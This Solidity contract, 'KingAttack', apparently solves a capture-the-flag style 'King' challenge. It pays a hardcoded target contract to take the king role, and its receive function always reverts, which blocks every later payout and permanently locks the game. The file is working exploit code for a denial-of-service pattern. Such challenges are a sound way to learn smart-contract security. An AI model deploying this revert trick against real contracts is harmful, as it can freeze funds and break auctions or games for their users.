// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingAttack {
    address payable public king;
    address hacker = 0xD214Ea0391454F43b295C5e22A5ceFe27573e596;
    uint fee = 2000000000000000;

    constructor() public payable {
        king = 0xC72d7083a7ea476Bee4ab71A42995cE3D76522Ab;
    }

    function becomeKing() public {
        (bool sent, bytes memory data) = king.call{value: fee}("");
        require(sent, "king doesn't answer");
    }

    receive() external payable {
        require(false);
    }

}